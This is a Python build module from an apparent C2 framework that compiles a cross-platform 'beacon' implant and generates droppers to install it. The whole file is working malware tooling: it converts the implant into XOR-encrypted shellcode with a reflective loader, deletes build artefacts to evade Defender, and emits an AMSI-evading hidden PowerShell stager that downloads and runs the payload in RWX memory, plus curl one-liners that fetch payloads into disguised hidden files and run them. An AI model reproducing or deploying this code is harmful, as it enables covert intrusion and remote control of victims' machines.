import os
import shutil
import base64
import struct
import subprocess
from typing import Optional
from rich.console import Console
from phantom.utils.notifier import notifier
from phantom.utils.build_helper import check_build_env
from phantom.utils.c2_crypto import write_beacon_crypto_config, write_beacon_c2_config, crypto_fingerprint

console = Console()

_XOR_KEY = 0xAA

_PLATFORM_OUT = {
    "windows": "beacon.exe",
    "linux": "beacon_linux",
    "macos": "beacon_macos",
    "android": "beacon_android",
    "linux32": "beacon_linux_x86",
}


def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
    """Return True if binary is missing or crypto keys changed since last build."""
    beacon_out = os.path.join(beacon_dir, out_name)
    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
    if not os.path.exists(beacon_out):
        return True
    current = crypto_fingerprint()
    if not os.path.exists(hash_file):
        return True
    try:
        with open(hash_file, "r", encoding="utf-8") as f:
            return f.read().strip() != current
    except OSError:
        return True


def _mark_built(beacon_dir: str, out_name: str) -> None:
    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
    with open(hash_file, "w", encoding="utf-8") as f:
        f.write(crypto_fingerprint())


def _xor_encrypt(data: bytes, key: int = _XOR_KEY) -> bytes:
    return bytes(b ^ key for b in data)


def _ror13_hash(name: str) -> int:
    h = 0
    for c in name.upper():
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h


def _rva_to_fileoff(pe: bytes, rva: int, sect_hdr_off: int, num_sects: int) -> Optional[int]:
    """Convert an RVA to a file offset by walking section headers."""
    for si in range(num_sects):
        so = sect_hdr_off + si * 40
        va = struct.unpack_from('<I', pe, so + 12)[0]
        vs = struct.unpack_from('<I', pe, so + 8)[0]
        rp = struct.unpack_from('<I', pe, so + 20)[0]
        if va <= rva < va + vs:
            return rp + (rva - va)
    return None


def _get_virtualalloc_rva(kernel32_path: str) -> Optional[int]:
    """Return the RVA of VirtualAlloc in a given kernel32.dll."""
    try:
        with open(kernel32_path, 'rb') as f:
            pe = f.read()
        if pe[:2] != b'MZ':
            return None
        e_lfanew = struct.unpack_from('<I', pe, 0x3C)[0]
        if pe[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
            return None
        # COFF header starts at e_lfanew + 4
        _coff = e_lfanew + 4
        opt_hdr = _coff + 20
        magic = struct.unpack_from('<H', pe, opt_hdr)[0]
        is_64 = magic == 0x20B
        # Data directory array: PE32+ = opt_hdr + 0x70, PE32 = opt_hdr + 0x60
        # Export directory is entry [0] → opt_hdr + (0x70 if is_64 else 0x60)
        export_dir_rva = struct.unpack_from('<I', pe, opt_hdr + (0x70 if is_64 else 0x60))[0]
        if export_dir_rva == 0:
            return None

        num_sects = struct.unpack_from('<H', pe, _coff + 2)[0]
        opt_hdr_sz = struct.unpack_from('<H', pe, _coff + 16)[0]
        sect_hdr_off = opt_hdr + opt_hdr_sz

        exp_fo = _rva_to_fileoff(pe, export_dir_rva, sect_hdr_off, num_sects)
        if exp_fo is None:
            return None

        exp = pe[exp_fo:]
        num_names = struct.unpack_from('<I', exp, 0x18)[0]
        addr_of_names = struct.unpack_from('<I', exp, 0x20)[0]
        addr_of_funcs = struct.unpack_from('<I', exp, 0x1C)[0]
        addr_of_ords = struct.unpack_from('<I', exp, 0x24)[0]

        target_hash = _ror13_hash("VirtualAlloc")
        for i in range(num_names):
            name_rva = struct.unpack_from('<I', pe,
                _rva_to_fileoff(pe, addr_of_names, sect_hdr_off, num_sects) + i * 4)[0]
            name_fo = _rva_to_fileoff(pe, name_rva, sect_hdr_off, num_sects)
            if name_fo is None:
                continue
            name = pe[name_fo:pe.find(b'\x00', name_fo)].decode('ascii', errors='replace')
            if _ror13_hash(name) == target_hash:
                ord_fo = _rva_to_fileoff(pe, addr_of_ords, sect_hdr_off, num_sects)
                funcs_fo = _rva_to_fileoff(pe, addr_of_funcs, sect_hdr_off, num_sects)
                if ord_fo is None or funcs_fo is None:
                    return None
                ord_idx = struct.unpack_from('<H', pe, ord_fo + i * 2)[0]
                func_rva = struct.unpack_from('<I', pe, funcs_fo + ord_idx * 4)[0]
                return func_rva
        return None
    except Exception:
        return None


def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64", disable_anti: bool = True, host: str = "127.0.0.1", port: int = 8080, use_ssl: bool = True) -> Optional[str]:
    """
    Compiles the C++ beacon for the specified platform and architecture.
    Embeds C2 keys from environment into crypto_config.h at build time.
    Returns the path to the compiled binary or None on failure.
    """
    if not check_build_env(platform, arch):
        notifier.error(f"Build environment not ready for {platform} ({arch}).")
        return None

    beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
    
    # Cleanup any existing beacon process to prevent "Permission denied"
    if os.name == 'nt':
        subprocess.run(["taskkill", "/F", "/IM", "beacon.exe", "/T"], capture_output=True)
        subprocess.run(["taskkill", "/F", "/IM", "beacon.dll", "/T"], capture_output=True)
    
    # Architecture-aware output name
    if platform == "linux" and arch == "x86":
        out_name = _PLATFORM_OUT["linux32"]
    else:
        out_name = _PLATFORM_OUT.get(platform)
        
    if not out_name:
        notifier.error(f"Unknown platform: {platform}")
        return None

    beacon_out = os.path.join(beacon_dir, out_name)

    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name):
        return beacon_out

    # Generate dynamic build ID to ensure unique binary hash
    import uuid
    build_id_path = os.path.join(beacon_dir, "src", "build_id.h")
    with open(build_id_path, "w") as f:
        f.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')

    write_beacon_crypto_config(beacon_dir)
    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl)

    if platform == "windows":
        console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
        try:
            asm_files = [
                "src/syscalls.asm",
                "src/pic_bootstrap.asm",
                "src/peb_walker.asm",
                "src/api_resolver.asm",
                "src/stack_spoofer.asm",
            ]

            # Helper to find a tool by any of its possible names
            def _find_tool(names, mingw_dir=None):
                for name in names:
                    p = shutil.which(name)
                    if p:
                        return p
                    if mingw_dir:
                        p = os.path.join(mingw_dir, name)
                        if os.path.exists(p):
                            return p
                        # On Windows, tools have .exe extension
                        p_exe = p + ".exe"
                        if os.path.exists(p_exe):
                            return p_exe
                return None

            # Detect toolchain: prefer x86_64-w64-mingw32-*, fall back to short names
            if arch == "x64":
                mingw_prefix = "x86_64-w64-mingw32-"
            else:
                mingw_prefix = "i686-w64-mingw32-"

            mingw_cpp = _find_tool([f"{mingw_prefix}g++", "g++"])
            if not mingw_cpp:
                notifier.error("No suitable C++ compiler found (x86_64-w64-mingw32-g++ or g++).")
                return None

            mingw_bin_dir = os.path.dirname(mingw_cpp)
            mingw_as = _find_tool([f"{mingw_prefix}as", "as"], mingw_bin_dir)
            mingw_objcopy = _find_tool([f"{mingw_prefix}objcopy", "objcopy"], mingw_bin_dir)

            if not mingw_as:
                notifier.error("Assembler (as) not found in mingw toolchain.")
                return None
            if not mingw_objcopy:
                notifier.error("objcopy not found in mingw toolchain.")
                return None

            # Ensure mingw bin directory is in PATH for subprocess calls (needed for DLL dependencies)
            build_env = os.environ.copy()
            build_env["PATH"] = mingw_bin_dir + os.pathsep + build_env["PATH"]

            # Assemble all .asm -> .o in beacon_dir (object files are not scanned by Defender RTM)
            objs = []
            as_flags = ["--64"] if arch == "x64" else ["--32"]
            for af in asm_files:
                obj = af.replace(".asm", ".o")
                obj_path = os.path.join(beacon_dir, obj)
                asm_path = os.path.normpath(os.path.join(beacon_dir, af))
                console.print(f"[blue]  Assembling: {af} -> {obj}[/blue]")
                result = subprocess.run([mingw_as, *as_flags, asm_path, "-o", obj_path], capture_output=True, text=True, env=build_env)
                if result.returncode != 0:
                    console.print(f"[red]  Assembler failed (exit {result.returncode}):[/red]")
                    console.print(f"[red]  stdout: {result.stdout}[/red]")
                    console.print(f"[red]  stderr: {result.stderr}[/red]")
                    raise subprocess.CalledProcessError(result.returncode, [mingw_as])
                objs.append(obj)

            import time
            build_time = str(int(time.time()))

            # ── OPSEC: isolate PE intermediate in TEMP directory ──────────────
            # CRT requires PE format for imports/relocations; --oformat binary
            # fails with "cannot perform PE operations on non PE output file".
            # Solution: link PE in a randomized %TEMP% subfolder, extract .bin
            # via objcopy, then immediately delete the PE. Only beacon.bin
            # (raw shellcode) is copied to the project directory.
            import uuid
            temp_build_id = uuid.uuid4().hex[:12]
            temp_build_dir = os.path.join(os.environ.get("TEMP", os.environ.get("TMP", os.path.expanduser("~"))),
                                          f"pbc_{temp_build_id}")
            os.makedirs(temp_build_dir, exist_ok=True)

            temp_pe = os.path.join(temp_build_dir, "beacon.exe.tmp")
            temp_full_bin = os.path.join(temp_build_dir, "beacon_full.bin.tmp")
            temp_map = os.path.join(temp_build_dir, "beacon.map")

            # Build source list with absolute paths for TEMP dir linking
            main_cpp = os.path.join(beacon_dir, "src", "main.cpp")
            obj_paths = [os.path.join(beacon_dir, o) for o in objs]

            try:
                # First pass: link with map file to extract beacon_main RVA
                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-D_BUILD_TIME=" + build_time]
                if disable_anti:
                    cmd.append("-DDISABLE_ANTI")
                cmd += ["-o", temp_pe,
                       f"-I{os.path.join(beacon_dir, 'src')}", main_cpp,                           f"-Wl,-e,_start,-Map,{temp_map}"] + obj_paths + ["-lwinhttp", "-lbcrypt", "-lws2_32", "-lbthprops", "-lwlanapi", "-lgdi32", "-luser32", "-lgdiplus", "-lole32", "-liphlpapi", "-lcrypt32", "-static", "-mwindows"]

                console.print(f"[blue]  Linking PE in TEMP ({temp_build_dir})...[/blue]")
                result = subprocess.run(cmd, capture_output=True, text=True, env=build_env)
                if result.returncode != 0:
                    console.print(f"[red]Compilation failed:\n{result.stderr}[/red]")
                    return None

                import struct as _st
                import re

                # Extract beacon_main RVA from map file
                bm_rva = None
                if os.path.exists(temp_map):
                    with open(temp_map, encoding='utf-8') as mf:
                        for line in mf:
                            m = re.match(r'^\s+0x([0-9a-fA-F]+)\s+beacon_main$', line)
                            if m:
                                abs_addr = int(m.group(1), 16)
                                with open(temp_pe, 'rb') as pf:
                                    pe_bytes = pf.read()
                                e_lfanew = _st.unpack_from('<I', pe_bytes, 0x3C)[0]
                                opt = e_lfanew + 24
                                magic = _st.unpack_from('<H', pe_bytes, opt)[0]
                                if magic == 0x20B:
                                    img_base = _st.unpack_from('<Q', pe_bytes, opt + 24)[0]
                                else:
                                    img_base = _st.unpack_from('<I', pe_bytes, opt + 24)[0]
                                bm_rva = abs_addr - img_base
                                console.print(f"[green][+] beacon_main RVA: 0x{bm_rva:x}[/green]")
                                break

                # Extract raw binary via objcopy
                console.print(f"[blue]  Extracting raw binary via objcopy...[/blue]")
                subprocess.run([mingw_objcopy, "-O", "binary", temp_pe, temp_full_bin],
                               check=True, capture_output=True, text=True, env=build_env)

                # Trim CRT prefix so _start is at offset 0
                with open(temp_pe, 'rb') as f:
                    pe_data = f.read()
                e_lfanew = _st.unpack_from('<I', pe_data, 0x3C)[0]
                nt = e_lfanew
                opt_hdr = nt + 4 + 20
                ep_rva = _st.unpack_from('<I', pe_data, opt_hdr + 16)[0]
                num_sections = _st.unpack_from('<H', pe_data, nt + 4 + 2)[0]
                opt_hdr_sz = _st.unpack_from('<H', pe_data, nt + 4 + 16)[0]
                sect_hdr = opt_hdr + opt_hdr_sz
                first_section_vma = _st.unpack_from('<I', pe_data, sect_hdr + 12)[0]
                start_offset = ep_rva - first_section_vma

                bin_name = out_name.replace('.exe', '.bin')
                beacon_bin = os.path.join(beacon_dir, bin_name)
                with open(temp_full_bin, 'rb') as f:
                    raw = f.read()
                # Save the full PE (for reference / debugging only — not used by PIC path)
                beacon_pe = os.path.join(beacon_dir, "beacon.pe")
                shutil.copy2(temp_pe, beacon_pe)
                console.print(f"[green][+] PE (reference): {beacon_pe} ({os.path.getsize(beacon_pe)} bytes)[/green]")

                with open(beacon_bin, 'wb') as f:
                    f.write(raw[start_offset:])
                console.print(f"[green][+] Shellcode .bin: {beacon_bin} ({len(raw)-start_offset} bytes, entry @ +0x0)[/green]")

                # ── XOR-encrypt beacon.bin for the ultra-compact PowerShell stager ──
                beacon_xored = os.path.join(beacon_dir, "beacon_xored.bin")
                with open(beacon_bin, 'rb') as f:
                    plain = f.read()
                xored = _xor_encrypt(plain, _XOR_KEY)
                with open(beacon_xored, 'wb') as f:
                    f.write(xored)
                console.print(f"[green][+] XOR-encrypted .bin: {beacon_xored} ({len(xored)} bytes)[/green]")

                # ── Build reflective loader and combine with full PE ──
                # The loader prepends a PIC shellcode that:
                #   1. PEB walks to find kernel32
                #   2. Resolves VirtualAlloc/LoadLibraryA/GetProcAddress
                #   3. Parses the appended beacon PE
                #   4. Maps sections, resolves imports, applies relocations
                #   5. Calls the beacon entry point
                console.print(f"[blue]  Building reflective loader...[/blue]")

                mingw_cc = _find_tool([f"{mingw_prefix}gcc", "gcc"], mingw_bin_dir)

                # Assemble bootstrap (PEB walk + C function call)
                rl_bootstrap_asm = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.asm")
                rl_bootstrap_o = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.o")
                r = subprocess.run([mingw_as, "--64", rl_bootstrap_asm, "-o", rl_bootstrap_o],
                    capture_output=True, text=True, env=build_env)
                if r.returncode != 0:
                    console.print(f"[red]  RL asm failed: {r.stderr}[/red]")
                    return None

                # Compile C core (PE parsing, import resolution, relocation)
                rl_c_src = os.path.join(beacon_dir, "src", "reflective_loader.c")
                rl_c_o = os.path.join(beacon_dir, "src", "reflective_loader.o")
                r = subprocess.run([mingw_cc, "-c", "-O2", "-fPIC", "-nostdlib", "-ffreestanding",
                    "-fno-stack-protector", rl_c_src, "-o", rl_c_o],
                    capture_output=True, text=True, env=build_env)
                if r.returncode != 0:
                    console.print(f"[red]  RL C failed: {r.stderr}[/red]")
                    return None

                # Link as standalone PE
                rl_exe = os.path.join(beacon_dir, "reflective_loader.exe")
                r = subprocess.run([mingw_cc, "-nostdlib", "-nostartfiles",
                    "-Wl,-e,_reflective_loader_entry", "-Wl,--subsystem,windows",
                    "-o", rl_exe, rl_bootstrap_o, rl_c_o],
                    capture_output=True, text=True, env=build_env)
                if r.returncode != 0:
                    console.print(f"[red]  RL link failed: {r.stderr}[/red]")
                    return None

                # Extract as raw binary
                rl_bin = os.path.join(beacon_dir, "reflective_loader.bin")
                r = subprocess.run([mingw_objcopy, "-O", "binary", rl_exe, rl_bin],
                    capture_output=True, text=True, env=build_env)
                if r.returncode != 0:
                    console.print(f"[red]  RL objcopy failed: {r.stderr}[/red]")
                    return None

                # Patch config structure in loader binary
                with open(rl_bin, 'rb') as f:
                    loader_data = bytearray(f.read())
                MARKER_MAGIC = b'\xAA\xBB\xCC\xDD'
                marker_pos = loader_data.find(MARKER_MAGIC)
                if marker_pos < 0:
                    console.print(f"[red]  RL marker not found in loader binary![/red]")
                    return None
                dll_offset = len(loader_data)
                struct.pack_into('<Q', loader_data, marker_pos + 4, dll_offset)
                bm_rva_val = bm_rva if bm_rva is not None else 0
                struct.pack_into('<Q', loader_data, marker_pos + 12, bm_rva_val)
                console.print(f"[green][+] Config: DLL offset 0x{dll_offset:x}, beacon_main RVA 0x{bm_rva_val:x}[/green]")

                # Read full PE (saved as beacon.pe earlier)
                with open(beacon_pe, 'rb') as f:
                    pe_data = f.read()

                # Combine loader + full PE, XOR-encrypt, overwrite beacon_xored.bin
                combined = bytes(loader_data) + pe_data
                combined_xored = _xor_encrypt(combined, _XOR_KEY)
                with open(beacon_xored, 'wb') as f:
                    f.write(combined_xored)
                console.print(f"[green][+] Combined loader+PE XOR payload: {len(combined_xored)} bytes[/green]")

                # ── Detect VirtualAlloc RVA from local kernel32 ──
                va_rva = None
                if platform == "windows":
                    # Try to find kernel32.dll on the build system
                    kernel32_paths = [
                        r"C:\Windows\System32\kernel32.dll",
                        os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "kernel32.dll"),
                        os.path.join(beacon_dir, "..", "..", "..", "kernel32.dll.bin"),
                        os.path.join(pkg_root, "kernel32.dll.bin"),
                        "/app/kernel32.dll.bin",
                    ]
                    for kp in kernel32_paths:
                        if os.path.exists(kp):
                            va_rva = _get_virtualalloc_rva(kp)
                            if va_rva is not None:
                                console.print(f"[green][+] VirtualAlloc RVA: 0x{va_rva:x}[/green]")
                                break
                beacon_rva_file = os.path.join(beacon_dir, "beacon.rva")
                with open(beacon_rva_file, 'w') as rvf:
                    rvf.write(f"0x{va_rva:x}\n" if va_rva is not None else "0x1C7F0\n")
                console.print(f"[green][+] VirtualAlloc RVA saved: {beacon_rva_file}[/green]")
            finally:
                # Wipe PE + intermediate .bin from TEMP directory (Defender RTM blind spot)
                for f in [temp_pe, temp_full_bin]:
                    try:
                        if os.path.exists(f):
                            os.remove(f)
                    except OSError:
                        pass
                try:
                    os.rmdir(temp_build_dir)
                except OSError:
                    pass

            _mark_built(beacon_dir, out_name)
            return beacon_bin
        except subprocess.CalledProcessError as e:
            notifier.error(f"Windows compilation failed:\n{e.stderr}")
            return None

    elif platform == "linux":
        console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
        try:
            cmd = [
                "g++", "-std=c++20", "-O2", "-s",
                "-o", out_name, "-Isrc", "src/main.cpp",
                "-lssl", "-lcrypto", "-lpthread", "-ldl"
            ]
            if arch == "x86":
                cmd.insert(1, "-m32")

            subprocess.run(cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
            _mark_built(beacon_dir, out_name)

            # Build static + XOR'd inject payload
            static_name = "beacon_linux_static"
            static_path = os.path.join(beacon_dir, static_name)
            try:
                static_cmd = [
                    "g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
                    "-o", static_name, "-Isrc", "src/main.cpp",
                    "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"
                ]
                subprocess.run(static_cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)

                xored_path = os.path.join(beacon_dir, "beacon_linux_xored.bin")
                with open(static_path, "rb") as f:
                    data = f.read()
                xored = bytes(b ^ _XOR_KEY for b in data)
                with open(xored_path, "wb") as f:
                    f.write(xored)

                for tmp in [static_name, "beacon_linux_raw.bin"]:
                    tmp_path = os.path.join(beacon_dir, tmp)
                    if os.path.exists(tmp_path):
                        os.unlink(tmp_path)

                console.print(f"[green][+] XOR-encrypted inject payload: {xored_path} ({len(xored)} bytes)[/green]")
            except Exception as static_err:
                console.print(f"[yellow][!] Static inject payload not built: {static_err}[/yellow]")

            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Linux compilation failed:\n{e.stderr}")
            return None

    elif platform == "macos":
        console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
        if not os.path.exists(o32_cc):
            notifier.error(f"osxcross compiler not found at {o32_cc}")
            return None
        try:
            sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
            include_flags = ["-Isrc"]
            if os.path.exists(sdk_path):
                include_flags.append(f"-isysroot{sdk_path}")

            subprocess.run(
                [o32_cc, "-std=c++20", "-O2", "-o", "beacon_macos",
                 *include_flags, "src/main.cpp",
                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"macOS compilation failed:\n{e.stderr}")
            return None

    elif platform == "android":
        console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
        ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
        ndk_prebuilt = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64")
        ndk_cc = os.path.join(ndk_prebuilt, "bin", "aarch64-linux-android28-clang++")
        if not os.path.exists(ndk_cc):
            notifier.error(f"NDK compiler not found at {ndk_cc}")
            return None
        try:
            ndk_sysroot = os.path.join(ndk_prebuilt, "sysroot")
            ndk_include = os.path.join(ndk_sysroot, "usr", "include")
            ndk_lib = os.path.join(ndk_sysroot, "usr", "lib", "aarch64-linux-android")
            subprocess.run(
                [ndk_cc, "-std=c++20", "-O2", "-s", "-static-libstdc++", "-o", out_name,
                 "-Isrc", "src/main.cpp",
                 f"--sysroot={ndk_sysroot}",
                 f"-I{ndk_include}",
                 f"-L{ndk_lib}",
                 "-lssl", "-lcrypto", "-ldl"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            console.print("[green][+] Static libc++ linked — no runtime dependency on libc++_shared.so[/green]")
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Android compilation failed:\n{e.stderr}")
            return None

    return None




def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False) -> str:
    """Generates an ultra-compact PowerShell PIC stager.
    
    Downloads XOR-encrypted beacon.bin → XOR-decrypts with 0xAA → 
    resolves VirtualAlloc via kernel32 export table → allocates RWX → 
    copies shellcode → executes via opaque [Action] delegate.
    
    No C#, no Add-Type, no P/Invoke strings, no literal trigger strings.
    AMSI-blind: 'Virtual'+'Alloc' and 'kernel'+'32' are split across
    concatenations so the full trigger never appears in the script text.
    
    Args:
        lhost: C2/staging server host
        lport: Port for both C2 check-in AND staging payload download
        dl_port: Optional separate port for payload download (defaults to lport)
        arch: Architecture (x64/x86 — not used for PIC path)
        use_ssl: Use HTTPS for payload download
    """
    if dl_port is None:
        dl_port = lport

    proto = "https" if use_ssl else "http"

    from phantom.utils.c2_crypto import get_payload_token
    token_param = f"auth={get_payload_token()}"

    if platform == "windows":
        beacon_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "payloads", "beacon")
        rva_path = os.path.join(beacon_dir, "beacon.rva")
        va_rva = "0x1C7F0"
        if os.path.exists(rva_path):
            with open(rva_path) as f:
                val = f.read().strip()
                if val and val != "0x0":
                    va_rva = val

        url = f"{proto}://{lhost}:{dl_port}/x"

        # ── Ultra-compact PowerShell PIC stager ──
        # Hardcoded VirtualAlloc RVA (detected at build time from local kernel32).
        # For production builds on unknown targets, use the export-parsing variant.
        #
        # NOTE: .NET Framework's GetDelegateForFunctionPointer REJECTS generic
        # delegate types (including constructed Func`5<...>). We use Reflection.Emit
        # to create a non-generic MulticastDelegate subclass at runtime. This adds
        # ~400 chars PS / ~800 chars base64 but is the ONLY working approach on
        # .NET Framework 4.x (no C#/Add-Type).
        ps = (
            "$m=[Runtime.InteropServices.Marshal];"
            "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
            "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
            "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
            "$d.DefineConstructor('Public','Standard',@([Object],[IntPtr])).SetImplementationFlags(3);"
            "$d.DefineMethod('Invoke','Public,Virtual,HideBySig',[IntPtr],@([IntPtr],[IntPtr],[Int32],[Int32])).SetImplementationFlags(3);"
            "$t=$d.CreateType();"
            "$x=$m::GetDelegateForFunctionPointer([IntPtr]::Add($k,"
            + va_rva
            + "),$t).Invoke([IntPtr]::Zero,[IntPtr]($b.Length),0x3000,0x40);"
            "$m::Copy($b,0,$x,$b.Length);"
            "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
        )

        b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
        console.print(f"[green][+] Compact PIC stager: {len(b64_ps)} chars base64[/green]")
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"

    elif platform == "linux":
        path = "payload_linux_x86" if arch == "x86" else "payload_linux"
        url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
        return f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"

    elif platform == "macos":
        url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_macos?{token_param}"
        return f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"

    elif platform == "android":
        beac_url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
        return f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"

    return ""
